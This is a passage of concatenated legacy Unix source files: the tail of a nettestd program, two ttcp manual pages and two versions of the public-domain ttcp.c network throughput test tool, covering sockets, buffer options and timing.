		"Usage: nettestd [-b] [-d] [-v] [-s val] [-p tcp] [port]\n",
		"       nettestd [-b] [-d] [-i] [-m] -p udp [port]\n",
#ifndef	NO_ISO
		"       nettestd [-b] [-d] [-v] -p iso [port]\n",
#else
		"",
#endif
		"       nettestd [-b] [-d] [-v] -p unix|pipe [filename]\n",
		"       nettestd [-b] [-d] [-m] -p unixd [filename]\n",
		"       nettestd [-b] [-d] [-v] -p file readfile writefile\n",
		"       nettestd -V\n");
	exit(1);
}

error(string)
char *string;
{
	if (daemon)
		syslog(LOG_ERR, "nettestd: %s %m", string);
	else
		perror(string);
}

# endif /* CRAYNETT */

/*	____	____	____	____	____	____	____	____	*/

# ifdef TTCP

::::::::::::::
ttcp-dpk.1
::::::::::::::
.TH TTCP 1 "10 October 1993"
.SH NAME
ttcp \- test tcp, tcp/udp to stdin/stdout passthru
.SH SYNOPSIS
.B ttcp
.B \-t/-r
[
.B \-kqsuQ]
] [
\-b
.I sobuflen
] [
\-l
.I len
] [
\-n
.I nbuf
] [
\-p
.I port
] [
.I host
]
.SH DESCRIPTION
.B ttcp
is a program which exists for two basic purposes.  First, it can be used
to test the TCP/UDP protocol stacks by using it in the sink/source mode.
The second use is as a program to connect TCP/UDP data streams to
stdin/stdout.  This program will either await an incoming connection
or initiate a connection to another host according to the options.
Upon completion, a report of the cpu time used and the network
throughput are given.  A condensed summary is also available.
.SH OPTIONS
.LP
When a
.I hostname
is specified on the end of the command line,
.B ttcp
will initiate the connection to the remote side.
The other side must have a pending listen on the desired port.
The flow of data is independent of the direction of connection.
In read mode,
.B ttcp
reads from the socket and writes to stdout.
In write mode,
.B ttcp
reads from stdin and writes to the socket.
.TP
.B \-l
.I len
specifies the amount of data passed to/from the kernel on each read
or write system call.
This defaults to 1024 bytes.
.TP
.B \-n
.I nbuf
specifies the number of buffers to be read or written to/from the network.
The total amount of data transfered will be the product of the number of
buffers and their size (\fIlen * nbuf\fR).  In read mode,
.I nbuf
defaults to 0 which implies read until EOF.
In write mode,
.I nbuf
defaults to 1024.
.TP
.B \-p
.I port
specifies the TCP or UDP port to be used for communication to the remote
side. (default 2000)
.TP
.B \-b
.I sobuflen
allows you to override the system default socket buffer size.
Altering this can dramatically effect the throughput of TCP in
may circumstances. (defauld 32768)
.TP
.B -B
only output full blocks, as specifed in the
.B -l
option.  This is useful with things like tar that do not
like partial blocks.
.TP
.B -k
set TCP keepalive socket option.
.TP
.B -q
quiet, progress messages and only a single summary line.
.TP
.B -Q
Quiet! One line sumary only.
.TP
.B \-s
source/sink mode.
.B ttcp sources data from an internal buffer in write mode,
and discards all data received in read mode.  This provides the
best test of the network stack without interfence to the test timing
from file I/O or data moving.
.TP
.B -u
use UDP instead of TCP.  This is raw UDP transmissions with no
mechanisms for data integrity or message encapsulation.  Its basically
only useful for abusing the UDP protocol stack in test situations.
The time it takes the sender to complete is a good number, as is the
percentage received by the client.
.SH EXAMPLE
.ta .6i 1.2i
.RS
The classic use of ttcp is to test the TCP throughput between two hosts.
The following test would send 8 megabytes from lion to tiger with 8k buffers
being written to the TCP subsystem.  The two processes will communication on
port 4321.  They use the sink and source mode so no date is read or written
from stdin/stdout.
.sp
On host tiger:
.br
	ttcp -r -s -p4321
.br
On host lion:
.br
	ttcp -t -s -p4321 -l8192 -n1024 tiger
.RE
.sp
.RS
This next example demonstrates using ttcp to connect stdin and stdout
to a TCP connection to do a remote dump:
.sp
On server system:
.br
	ttcp -r -p2001 -l8192 > dump.root.Z
.br
On client system:
.br
	dump 0uf - / | compress | ttcp -t -p2001 -l8192 serverhostname
.RE
.SH "SEE ALSO"
cat (1), dd(1), socket(2)
.SH AUTHORS
Originally written at the U.S.Army Ballistics Research Laboratory
by Mike Muuss, with numerous improvements from others.
::::::::::::::
ttcp-dpk.c
::::::::::::::
#ifndef lint
static char *sccsid = "@(#)ttcp.c	1.2	MS/ACF	88/10/20";
#endif
/*
 *	T T C P . C
 *
 * Test TCP connection.  Makes a connection on port 2000
 * and transfers zero buffers or data copied from stdin.
 *
 * Usable on 4.2, 4.3, and 4.1a systems by defining one of
 * BSD42 BSD43 (BSD41a)
 *
 * Modified for operation under 4.2BSD, 18 Dec 84
 *      T.C. Slattery, USNA
 * Minor improvements, Mike Muuss and Terry Slattery, 16-Oct-85.
 */
#ifndef lint
static char RCSid[] = "@(#)$Header: /u/src/usr/local/bin/RCS/ttcp.c,v 1.5 1993/10/10 17:42:59 dpk Exp $ (BRL)";
#endif

#define BSD43
/* #define BSD42 */
/* #define BSD41a */

#include <stdio.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <errno.h>

struct sockaddr_in sinme;
struct sockaddr_in sinhim;
struct sockaddr_in sindum;
struct sockaddr_in frominet;

int domain, fromlen;
int fd;				/* fd of network socket */

int buflen = 1024;		/* length of buffer */
char *buf;			/* ptr to dynamic buffer */
int nbuf = 1024;		/* number of buffers to send in sinkmode */

int udp = 0;			/* 0 = tcp, !0 = udp */
int options = 0;		/* socket options */
int one = 1;                    /* for 4.3 BSD style setsockopt() */
short port = 2000;		/* TCP port number */
char *host;			/* ptr to name of host */
int buffer = 32768;		/* kernel socket buffering request */
int trans;			/* 0=receive, !0=transmit mode */
int client;			/* 0=server, !0=client mode */
int sinkmode;			/* 0=normal I/O, !0=sink/source mode */
int keepalive;			/* 0=no keepalives, 1=set keepalive option */
int noise = 2;			/* 2=normal
				   1=progress messages, and one line summary
				   0=one line summary only */

struct hostent *addr;
extern int errno;

char Usage[] = "\
Usage: ttcp -t [-options] [host] <in\n\
	-l##	length of bufs written to network (default 1024)\n\
	-s	source a pattern to network\n\
	-n##	number of bufs written to network (-s only, default 1024)\n\
	-p##	port number to send to (default 2000)\n\
Usage: ttcp -r [-options] [host] >out\n\
	-l##	length of network read buf (default 1024)\n\
	-s	sink (discard) all data from network\n\
	-n##	number of bufs read from network (-s only, default til EOF)\n\
	-p##	port number to listen at (default 2000)\n\
	-B	Only output full blocks, as specified in -l## (for TAR)\n\
    (both)\n\
	-b##	size of kernel socket buffers for TCP (default 32768)\n\
	-k	use keepalive on TCP\n\
	-u	use UDP instead of TCP\n\
	-q	quiet, progress messages and only one line summary\n\
	-Q	Quiet, one line summary only\n\
    summary format:\n\
    ttcp [-t/r] -p# -l# -b# [-s] [host] : #bytes : cpu : k/cpu : real : k/sec\n\
";	

char stats[128];
double t;			/* transmission time */
long nbytes;			/* bytes on net */
int b_flag = 0;			/* use mread() */

void prep_timer();
double read_timer();
double cput, realt;		/* user, real time (seconds) */

main(argc,argv)
int argc;
char **argv;
{

	if (argc < 2) goto usage;

	argv++; argc--;
	while( argc>0 && argv[0][0] == '-' )  {
		switch (argv[0][1]) {

		case 'B':
			b_flag = 1;
			break;
		case 'b':
			buffer = atoi(&argv[0][2]);
			break;
		case 't':
			trans = 1;
			break;
		case 'r':
			trans = 0;
			nbuf = 0;	/* unlimited received, unless specified */
			break;
		case 'd':
			options |= SO_DEBUG;
			break;
		case 'n':
			nbuf = atoi(&argv[0][2]);
			break;
		case 'l':
			buflen = atoi(&argv[0][2]);
			break;
		case 's':
			sinkmode = 1;	/* source or sink, really */
			break;
		case 'p':
			port = atoi(&argv[0][2]);
			break;
		case 'u':
			udp = 1;
			break;
		case 'k':
			keepalive = 1;
			break;
		case 'q':
			noise=1;
			break;
		case 'Q':
			noise=0;
			break;
		default:
			goto usage;
		}
		argv++; argc--;
	}
	if (argc == 1) {
		/* Client */
		bzero((char *)&sinhim, sizeof(sinhim));
		host = argv[0];
		if (atoi(host) > 0 )  {
			/* Numeric */
			sinhim.sin_family = AF_INET;
			sinhim.sin_addr.s_addr = inet_addr(host);
		} else {
			if ((addr=gethostbyname(host)) == NULL)
				err("bad hostname");
			sinhim.sin_family = addr->h_addrtype;
			bcopy(addr->h_addr,(char*)&sinhim.sin_addr, addr->h_length);
		}
		sinhim.sin_port = htons(port);
		sinme.sin_port = 0;		/* free choice */
		client++;
	} else if (argc == 0) {
		/* Server */
		sinme.sin_port =  htons(port);
	} else {
		goto usage;
	}

	if( (buf = (char *)malloc(buflen)) == (char *)NULL)
		err("malloc");
	if (noise>0)
		fprintf(stderr,"ttcp%s: nbuf=%d, buflen=%d, port=%d\n",
			trans?"-t":"-r",
			nbuf, buflen, port);

	if ((fd = socket(AF_INET, udp?SOCK_DGRAM:SOCK_STREAM, 0)) < 0)
		err("socket");
	if (noise>0) mes("socket");
	if(setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one)) < 0)
		err("setsockopt(SO_REUSEADDR)");

	if (bind(fd, &sinme, sizeof(sinme)) < 0)
		err("bind");

	if (!udp)  {
	    if (client) {
		/* We are the client if transmitting */
		if(options)  {
#ifdef BSD42
			if( setsockopt(fd, SOL_SOCKET, options, 0, 0) < 0)
#else BSD43
			if( setsockopt(fd, SOL_SOCKET, options, &one, sizeof(one)) < 0)
#endif
				err("setsockopt(DEBUG)");
		}
		if(connect(fd, &sinhim, sizeof(sinhim) ) < 0)
			err("connect");
		if (noise>0) mes("connect");
	    } else {
		/* otherwise, we are the server and 
	         * should listen for the connections
	         */
		listen(fd,0);   /* allow a queue of 0 */
		if(options)  {
#ifdef BSD42
			if( setsockopt(fd, SOL_SOCKET, options, 0, 0) < 0)
#else BSD43
			if( setsockopt(fd, SOL_SOCKET, options, &one, sizeof(one)) < 0)
#endif
				err("setsockopt");
		}
		fromlen = sizeof(frominet);
		domain = AF_INET;
		if((fd=accept(fd, &frominet, &fromlen) ) < 0)
			err("accept");
		if (noise > 0) mes("accept");
	    }
	}
	if(setsockopt(fd, SOL_SOCKET, SO_RCVBUF, &buffer, sizeof(buffer)) < 0)
		err("setsockopt(SO_RCVBUF)");
	if(setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &buffer, sizeof(buffer)) < 0)
		err("setsockopt(SO_SNDBUF)");
#ifdef BSD43
	if(!udp && keepalive && 
	   setsockopt(fd, SOL_SOCKET, SO_KEEPALIVE, &one, sizeof(one)) < 0)
		err("setsockopt(SO_KEEPALIVE)");
#endif
	prep_timer();
	errno = 0;
	if (sinkmode) {      
		register int cnt;
		if (trans)  {
			pattern( buf, buflen );
			if(udp)  (void)Nwrite( fd, buf, 4 ); /* rcvr start */
			while (nbuf-- && Nwrite(fd,buf,buflen) == buflen)
				nbytes += buflen;
			if(udp)  (void)Nwrite( fd, buf, 4 ); /* rcvr end */
		} else {
			long desiredbytes = nbuf*buflen;
				
			while ((cnt=Nread(fd,buf,buflen)) > 0)  {
				static int going = 0;
				if( cnt <= 4 )  {
					if( going )
						break;	/* "EOF" */
					going = 1;
					prep_timer();
				} else
					nbytes += cnt;
				if (desiredbytes && (nbytes >= desiredbytes))
					break;
			}
		}
	} else {
		register int cnt;
		if (trans)  {
			while((cnt=read(0,buf,buflen)) > 0 &&
			    Nwrite(fd,buf,cnt) == cnt)
				nbytes += cnt;
		}  else  {
			while((cnt=Nread(fd,buf,buflen)) > 0 &&
			    write(1,buf,cnt) == cnt)
				nbytes += cnt;
		}
	}
	if(errno) err("IO");
	(void)read_timer(stats,sizeof(stats));
	if(udp&&trans)  {
		(void)Nwrite( fd, buf, 4 ); /* rcvr end */
		(void)Nwrite( fd, buf, 4 ); /* rcvr end */
		(void)Nwrite( fd, buf, 4 ); /* rcvr end */
		(void)Nwrite( fd, buf, 4 ); /* rcvr end */
	}
	if (noise>1) {
		/* Original noisy output */
		fprintf(stderr,"ttcp%s: %s\n", trans?"-t":"-r", stats);
		if( cput <= 0.0 )  cput = 0.001;
		if( realt <= 0.0 )  realt = 0.001;
		fprintf(stderr,"ttcp%s: %ld bytes in %f CPU seconds = %f KB/cpu sec\n",
			trans?"-t":"-r",
			nbytes, cput, ((double)nbytes)/cput/1024 );
		fprintf(stderr,"ttcp%s: %ld bytes in %f real seconds = %f KB/sec\n",
			trans?"-t":"-r",
			nbytes, realt, ((double)nbytes)/realt/1024 );
	} else {
fprintf(stderr, "ttcp %s -p%d -l%d -b%d%s%s %s : %ld : %f : %f : %f : %f\n",
			trans?"-t":"-r",
			port,
			buflen,
			buffer,
			sinkmode ? " -s" : "",
			noise == 0 ? " -Q" : (noise == 1 ? " -q" : ""),
			client ? host : "",
			nbytes,
			cput, ((double)nbytes)/cput/1024,
			realt, ((double)nbytes)/realt/1024 );
	}
	exit(0);

usage:
	fprintf(stderr,Usage);
	exit(1);
}

err(s)
char *s;
{
	fprintf(stderr,"ttcp%s: ", trans?"-t":"-r");
	perror(s);
	fprintf(stderr,"errno=%d\n",errno);
	exit(1);
}

mes(s)
char *s;
{
	fprintf(stderr,"ttcp%s: %s\n", trans?"-t":"-r", s);
}

pattern( cp, cnt )
register char *cp;
register int cnt;
{
	register char c;
	c = 0;
	while( cnt-- > 0 )  {
		while( !isprint((c&0x7F)) )  c++;
		*cp++ = (c++&0x7F);
	}
}

static struct	timeval time0;	/* Time at which timeing started */
static struct	rusage ru0;	/* Resource utilization at the start */

static void prusage();
static void tvadd();
static void tvsub();
static void psecs();

/*
 *			P R E P _ T I M E R
 */
void
prep_timer()
{
	gettimeofday(&time0, (struct timezone *)0);
	getrusage(RUSAGE_SELF, &ru0);
}

/*
 *			R E A D _ T I M E R
 * 
 */
double
read_timer(str,len)
char *str;
{
	struct timeval timedol;
	struct rusage ru1;
	struct timeval td;
	struct timeval tend, tstart;
	char line[132];

	getrusage(RUSAGE_SELF, &ru1);
	gettimeofday(&timedol, (struct timezone *)0);
	prusage(&ru0, &ru1, &timedol, &time0, line);
	(void)strncpy( str, line, len );

	/* Get real time */
	tvsub( &td, &timedol, &time0 );
	realt = td.tv_sec + ((double)td.tv_usec) / 1000000;

	/* Get CPU time (user+sys) */
	tvadd( &tend, &ru1.ru_utime, &ru1.ru_stime );
	tvadd( &tstart, &ru0.ru_utime, &ru0.ru_stime );
	tvsub( &td, &tend, &tstart );
	cput = td.tv_sec + ((double)td.tv_usec) / 1000000;
	if( cput < 0.00001 )  cput = 0.00001;
	return( cput );
}

static void
prusage(r0, r1, e, b, outp)
	register struct rusage *r0, *r1;
	struct timeval *e, *b;
	char *outp;
{
	struct timeval tdiff;
	register time_t t;
	register char *cp;
	register int i;
	int ms;

	t = (r1->ru_utime.tv_sec-r0->ru_utime.tv_sec)*100+
	    (r1->ru_utime.tv_usec-r0->ru_utime.tv_usec)/10000+
	    (r1->ru_stime.tv_sec-r0->ru_stime.tv_sec)*100+
	    (r1->ru_stime.tv_usec-r0->ru_stime.tv_usec)/10000;
	ms =  (e->tv_sec-b->tv_sec)*100 + (e->tv_usec-b->tv_usec)/10000;

#define END(x)	{while(*x) x++;}
	cp = "%Uuser %Ssys %Ereal %P %Xi+%Dd %Mmaxrss %F+%Rpf %Ccsw";
	for (; *cp; cp++)  {
		if (*cp != '%')
			*outp++ = *cp;
		else if (cp[1]) switch(*++cp) {

		case 'U':
			tvsub(&tdiff, &r1->ru_utime, &r0->ru_utime);
			sprintf(outp,"%d.%01d", tdiff.tv_sec, tdiff.tv_usec/100000);
			END(outp);
			break;

		case 'S':
			tvsub(&tdiff, &r1->ru_stime, &r0->ru_stime);
			sprintf(outp,"%d.%01d", tdiff.tv_sec, tdiff.tv_usec/100000);
			END(outp);
			break;

		case 'E':
			psecs(ms / 100, outp);
			END(outp);
			break;

		case 'P':
			sprintf(outp,"%d%%", (int) (t*100 / ((ms ? ms : 1))));
			END(outp);
			break;

		case 'W':
			i = r1->ru_nswap - r0->ru_nswap;
			sprintf(outp,"%d", i);
			END(outp);
			break;

		case 'X':
			sprintf(outp,"%d", t == 0 ? 0 : (r1->ru_ixrss-r0->ru_ixrss)/t);
			END(outp);
			break;

		case 'D':
			sprintf(outp,"%d", t == 0 ? 0 :
			    (r1->ru_idrss+r1->ru_isrss-(r0->ru_idrss+r0->ru_isrss))/t);
			END(outp);
			break;

		case 'K':
			sprintf(outp,"%d", t == 0 ? 0 :
			    ((r1->ru_ixrss+r1->ru_isrss+r1->ru_idrss) -
			    (r0->ru_ixrss+r0->ru_idrss+r0->ru_isrss))/t);
			END(outp);
			break;

		case 'M':
			sprintf(outp,"%d", r1->ru_maxrss/2);
			END(outp);
			break;

		case 'F':
			sprintf(outp,"%d", r1->ru_majflt-r0->ru_majflt);
			END(outp);
			break;

		case 'R':
			sprintf(outp,"%d", r1->ru_minflt-r0->ru_minflt);
			END(outp);
			break;

		case 'I':
			sprintf(outp,"%d", r1->ru_inblock-r0->ru_inblock);
			END(outp);
			break;

		case 'O':
			sprintf(outp,"%d", r1->ru_oublock-r0->ru_oublock);
			END(outp);
			break;
		case 'C':
			sprintf(outp,"%d+%d", r1->ru_nvcsw-r0->ru_nvcsw,
				r1->ru_nivcsw-r0->ru_nivcsw );
			END(outp);
			break;
		}
	}
	*outp = '\0';
}

static void
tvadd(tsum, t0, t1)
	struct timeval *tsum, *t0, *t1;
{

	tsum->tv_sec = t0->tv_sec + t1->tv_sec;
	tsum->tv_usec = t0->tv_usec + t1->tv_usec;
	if (tsum->tv_usec > 1000000)
		tsum->tv_sec++, tsum->tv_usec -= 1000000;
}

static void
tvsub(tdiff, t1, t0)
	struct timeval *tdiff, *t1, *t0;
{

	tdiff->tv_sec = t1->tv_sec - t0->tv_sec;
	tdiff->tv_usec = t1->tv_usec - t0->tv_usec;
	if (tdiff->tv_usec < 0)
		tdiff->tv_sec--, tdiff->tv_usec += 1000000;
}

static void
psecs(l,cp)
long l;
register char *cp;
{
	register int i;

	i = l / 3600;
	if (i) {
		sprintf(cp,"%d:", i);
		END(cp);
		i = l % 3600;
		sprintf(cp,"%d%d", (i/60) / 10, (i/60) % 10);
		END(cp);
	} else {
		i = l;
		sprintf(cp,"%d", i / 60);
		END(cp);
	}
	i %= 60;
	*cp++ = ':';
	sprintf(cp,"%d%d", i / 10, i % 10);
}

Nread( fd, buf, count )
{
	struct sockaddr_in from;
	int len = sizeof(from);
	register int cnt;
	if( udp )  {
		cnt = recvfrom( fd, buf, count, 0, &from, &len );
	} else {
		if( b_flag )
			cnt = mread( fd, buf, count );	/* fill buf */
		else
			cnt = read( fd, buf, count );
	}
	return(cnt);
}
Nwrite( fd, buf, count )
{
	register int cnt;
	if( udp )  {
again:
		cnt = sendto( fd, buf, count, 0, &sinhim, sizeof(sinhim) );
		if( cnt<0 && errno == ENOBUFS )  {
			delay(18000);
			errno = 0;
			goto again;
		}
	} else {
		cnt = write( fd, buf, count );
	}
	return(cnt);
}

delay(us)
{
	struct timeval tv;

	tv.tv_sec = 0;
	tv.tv_usec = us;
	(void)select( 1, (char *)0, (char *)0, (char *)0, &tv );
	return(1);
}

/*
 *			M R E A D
 *
 * This function performs the function of a read(II) but will
 * call read(II) multiple times in order to get the requested
 * number of characters.  This can be necessary because
 * network connections don't deliver data with the same
 * grouping as it is written with.  Written by Robert S. Miles, BRL.
 */
int
mread(fd, bufp, n)
int fd;
register char	*bufp;
unsigned	n;
{
	register unsigned	count = 0;
	register int		nread;

	do {
		nread = read(fd, bufp, n-count);
		if(nread < 0)  {
			perror("ttcp_mread");
			return(-1);
		}
		if(nread == 0)
			return((int)count);
		count += (unsigned)nread;
		bufp += nread;
	 } while(count < n);

	return((int)count);
}
::::::::::::::
ttcp1.1
::::::::::::::
TTCP(1)                                                                TTCP(1)

NAME
     ttcp - test TCP and UDP performance

SYNOPSIS
     ttcp -t [-u] [-s] [-p port] [-l buflen] [-b size] [-n numbufs] [-A align]
     [-O offset] [-f format] [-D] [-v] host [<in]

     ttcp -r [-u] [-s] [-p port] [-l buflen] [-b size] [-A align] [-O offset]
     [-f format] [-B] [-T] [-v] [>out]

DESCRIPTION
     Ttcp times the transmission and reception of data between two systems
     using the UDP or TCP protocols.  It differs from common ``blast'' tests,
     which tend to measure the remote inetd as much as the network
     performance, and which usually do not allow measurements at the remote
     end of a UDP transmission.

     For testing, the transmitter should be started with -t and -s after the
     receiver has been started with -r and -s.  Tests lasting at least tens of
     seconds should be used to obtain accurate measurements.  Graphical
     presentations of throughput versus buffer size for buffers ranging from
     tens of bytes to several ``pages'' can illuminate bottlenecks.

     Ttcp can also be used as a ``network pipe'' for moving directory
     hierarchies between systems when routing problems exist or when the use
     of other mechanisms is undesirable. For example, on the destination
     machine, use:

        ttcp -r -B | tar xvpf -

     and on the source machine:

        tar cf - directory | ttcp -t dest_machine

     Additional intermediate machines can be included by:

        ttcp -r | ttcp -t next_machine

OPTIONS
     -t        Transmit mode.

     -r        Receive mode.

     -u        Use UDP instead of TCP.

     -s        If transmitting, source a data pattern to network; if receiv-
               ing, sink (discard) the data.  Without the -s option, the
               default is to transmit data from stdin or print the received
               data to stdout.

     -l length Length of buffers in bytes (default 8192).  For UDP, this value
               is the number of data bytes in each packet.  The system limits
               the maximum UDP packet length. This limit can be changed with
               the -b option.

               When testing UDP performance, it is important to set the packet
               size to be less than or equal to the maximum transmission unit
               of the media.  Otherwise, IP fragmentation will distort the
               test.  For Ethernet, set the length to 1508 bytes.

     -b size   Set size of socket buffer.  The default varies from system to
               system.  This parameter affects the maximum UDP packet length.
               It may not be possible to set this parameter on some systems
               (for example, 4.2BSD).

     -n numbufs
               Number of source buffers transmitted (default 2048).

     -p port   Port number to send to or listen on (default 2000).  On some
               systems, this port may be allocated to another network daemon.

     -D        If transmitting using TCP, do not buffer data when sending
               (sets the TCP_NODELAY socket option).  It may not be possible
               to set this parameter on some systems (for example, 4.2BSD).

     -B        When receiving data, output only full blocks, using the block
               size specified by -l.  This option is useful for programs, such
               as tar(1), that require complete blocks.

     -A align  Align the start of buffers to this modulus (default 16384).

     -O offset Align the start of buffers to this offset (default 0).  For
               example, ``-A8192 -O1'' causes buffers to start at the second
               byte of an 8192-byte page.

     -f format Specify, using one of the following characters, the format of
               the throughput rates as kilobits/sec ('k'), kilobytes/sec
               ('K'), megabits/sec ('m'), megabytes/sec ('M'), gigabits/sec
               ('g'), or gigabytes/sec ('G').  The default is 'K'.

     -T        ``Touch'' the data as they are read in order to measure cache
               effects.

     -v        Verbose: print more statistics.

     -d        Debug: set the SO_DEBUG socket option.

SEE ALSO
     ping(1), traceroute(1)
::::::::::::::
ttcp1.c
::::::::::::::
/*
 *	T T C P . C
 *
 * Test TCP connection.  Makes a connection on port 2000
 * and transfers zero buffers or data copied from stdin.
 *
 * Usable on 4.2, 4.3, and 4.1a systems by defining one of
 * BSD42 BSD43 (BSD41a)
 *
 * Modified for operation under 4.2BSD, 18 Dec 84
 *      T.C. Slattery, USNA
 * Minor improvements, Mike Muuss and Terry Slattery, 16-Oct-85.
 *
 * Mike Muuss and Terry Slattery have released this code to the Public Domain.
 */
#ifndef lint
static char RCSid[] = "@(#)$Header: ttcp.c,v 1.11 90/11/04 04:05:51 reschly Exp $ (BRL)";
#endif

#define BSD43
/* #define BSD42 */
/* #define BSD41a */

#include <stdio.h>
#include <ctype.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <sys/time.h>		/* struct timeval */

#ifdef SYSV
#include <sys/times.h>
#include <sys/param.h>
#else
#include <sys/resource.h>
#endif

struct sockaddr_in sinme;
struct sockaddr_in sinhim;
struct sockaddr_in sindum;
struct sockaddr_in frominet;

int domain, fromlen;
int fd;				/* fd of network socket */

int buflen = 1024;		/* length of buffer */
char *buf;			/* ptr to dynamic buffer */
int nbuf = 1024;		/* number of buffers to send in sinkmode */

int udp = 0;			/* 0 = tcp, !0 = udp */
int options = 0;		/* socket options */
int one = 1;                    /* for 4.3 BSD style setsockopt() */
short port = 2000;		/* TCP port number */
char *host;			/* ptr to name of host */
int trans;			/* 0=receive, !0=transmit mode */
int sinkmode;			/* 0=normal I/O, !0=sink/source mode */

struct hostent *addr;
extern int errno;

char Usage[] = "\
Usage: ttcp -t [-options] host <in\n\
	-l##	length of bufs written to network (default 1024)\n\
	-s	source a pattern to network\n\
	-n##	number of bufs written to network (-s only, default 1024)\n\
	-p##	port number to send to (default 2000)\n\
	-u	use UDP instead of TCP\n\
Usage: ttcp -r [-options] >out\n\
	-l##	length of network read buf (default 1024)\n\
	-s	sink (discard) all data from network\n\
	-p##	port number to listen at (default 2000)\n\
	-B	Only output full blocks, as specified in -l## (for TAR)\n\
	-u	use UDP instead of TCP\n\
";	

char stats[128];
double t;			/* transmission time */
long nbytes;			/* bytes on net */
int b_flag = 0;			/* use mread() */

void prep_timer();
double read_timer();
double cput, realt;		/* user, real time (seconds) */

main(argc,argv)
int argc;
char **argv;
{
	unsigned long addr_tmp;

	if (argc < 2) goto usage;

	argv++; argc--;
	while( argc>0 && argv[0][0] == '-' )  {
		switch (argv[0][1]) {

		case 'B':
			b_flag = 1;
			break;
		case 't':
			trans = 1;
			break;
		case 'r':
			trans = 0;
			break;
		case 'd':
			options |= SO_DEBUG;
			break;
		case 'n':
			nbuf = atoi(&argv[0][2]);
			break;
		case 'l':
			buflen = atoi(&argv[0][2]);
			break;
		case 's':
			sinkmode = 1;	/* source or sink, really */
			break;
		case 'p':
			port = atoi(&argv[0][2]);
			break;
		case 'u':
			udp = 1;
			break;
		default:
			goto usage;
		}
		argv++; argc--;
	}
	if(trans)  {
		/* xmitr */
		if (argc != 1) goto usage;
		bzero((char *)&sinhim, sizeof(sinhim));
		host = argv[0];
		if (atoi(host) > 0 )  {
			/* Numeric */
			sinhim.sin_family = AF_INET;
#ifdef cray
			addr_tmp = inet_addr(host);
			sinhim.sin_addr = addr_tmp;
#else
			sinhim.sin_addr.s_addr = inet_addr(host);
#endif
		} else {
			if ((addr=gethostbyname(host)) == NULL)
				err("bad hostname");
			sinhim.sin_family = addr->h_addrtype;
			bcopy(addr->h_addr,(char*)&addr_tmp, addr->h_length);
#ifdef cray
			sinhim.sin_addr = addr_tmp;
#else
			sinhim.sin_addr.s_addr = addr_tmp;
#endif cray
		}
		sinhim.sin_port = htons(port);
		sinme.sin_port = 0;		/* free choice */
	} else {
		/* rcvr */
		sinme.sin_port =  htons(port);
	}

	if( (buf = (char *)malloc(buflen)) == (char *)NULL)
		err("malloc");
	fprintf(stderr,"ttcp%s: nbuf=%d, buflen=%d, port=%d\n",
		trans?"-t":"-r",
		nbuf, buflen, port);

	if ((fd = socket(AF_INET, udp?SOCK_DGRAM:SOCK_STREAM, 0)) < 0)
		err("socket");
	mes("socket");

	if (bind(fd, &sinme, sizeof(sinme)) < 0)
		err("bind");

	if (!udp)  {
	    if (trans) {
		/* We are the client if transmitting */
		if(options)  {
#ifdef BSD42
			if( setsockopt(fd, SOL_SOCKET, options, 0, 0) < 0)
#else BSD43
			if( setsockopt(fd, SOL_SOCKET, options, &one, sizeof(one)) < 0)
#endif
				err("setsockopt");
		}
		if(connect(fd, &sinhim, sizeof(sinhim) ) < 0)
			err("connect");
		mes("connect");
	    } else {
		/* otherwise, we are the server and 
	         * should listen for the connections
	         */
		listen(fd,0);   /* allow a queue of 0 */
		if(options)  {
#ifdef BSD42
			if( setsockopt(fd, SOL_SOCKET, options, 0, 0) < 0)
#else BSD43
			if( setsockopt(fd, SOL_SOCKET, options, &one, sizeof(one)) < 0)
#endif
				err("setsockopt");
		}
		fromlen = sizeof(frominet);
		domain = AF_INET;
		if((fd=accept(fd, &frominet, &fromlen) ) < 0)
			err("accept");
		mes("accept");
	    }
	}
	prep_timer();
	errno = 0;
	if (sinkmode) {      
		register int cnt;
		if (trans)  {
			pattern( buf, buflen );
			if(udp)  (void)Nwrite( fd, buf, 4 ); /* rcvr start */
			while (nbuf-- && Nwrite(fd,buf,buflen) == buflen)
				nbytes += buflen;
			if(udp)  (void)Nwrite( fd, buf, 4 ); /* rcvr end */
		} else {
			while ((cnt=Nread(fd,buf,buflen)) > 0)  {
				static int going = 0;
				if( cnt <= 4 )  {
					if( going )
						break;	/* "EOF" */
					going = 1;
					prep_timer();
				} else
					nbytes += cnt;
			}
		}
	} else {
		register int cnt;
		if (trans)  {
			while((cnt=read(0,buf,buflen)) > 0 &&
			    Nwrite(fd,buf,cnt) == cnt)
				nbytes += cnt;
		}  else  {
			while((cnt=Nread(fd,buf,buflen)) > 0 &&
			    write(1,buf,cnt) == cnt)
				nbytes += cnt;
		}
	}
	if(errno) err("IO");
	(void)read_timer(stats,sizeof(stats));
	if(udp&&trans)  {
		(void)Nwrite( fd, buf, 4 ); /* rcvr end */
		(void)Nwrite( fd, buf, 4 ); /* rcvr end */
		(void)Nwrite( fd, buf, 4 ); /* rcvr end */
		(void)Nwrite( fd, buf, 4 ); /* rcvr end */
	}
	fprintf(stderr,"ttcp%s: %s\n", trans?"-t":"-r", stats);
	if( cput <= 0.0 )  cput = 0.001;
	if( realt <= 0.0 )  realt = 0.001;
	fprintf(stderr,"ttcp%s: %ld bytes processed\n",
		trans?"-t":"-r", nbytes );
	fprintf(stderr,"ttcp%s: %9g CPU sec  = %9g KB/cpu sec,  %9g Kbits/cpu sec\n",
		trans?"-t":"-r",
		cput,
		((double)nbytes)/cput/1024,
		((double)nbytes)*8/cput/1024 );
	fprintf(stderr,"ttcp%s: %9g real sec = %9g KB/real sec, %9g Kbits/sec\n",
		trans?"-t":"-r",
		realt,
		((double)nbytes)/realt/1024,
		((double)nbytes)*8/realt/1024 );
	exit(0);

usage:
	fprintf(stderr,Usage);
	exit(1);
}

err(s)
char *s;
{
	fprintf(stderr,"ttcp%s: ", trans?"-t":"-r");
	perror(s);
	fprintf(stderr,"errno=%d\n",errno);
	exit(1);
}

mes(s)
char *s;
{
	fprintf(stderr,"ttcp%s: %s\n", trans?"-t":"-r", s);
}

pattern( cp, cnt )
register char *cp;
register int cnt;
{
	register char c;
	c = 0;
	while( cnt-- > 0 )  {
		while( !isprint((c&0x7F)) )  c++;
		*cp++ = (c++&0x7F);
	}
}

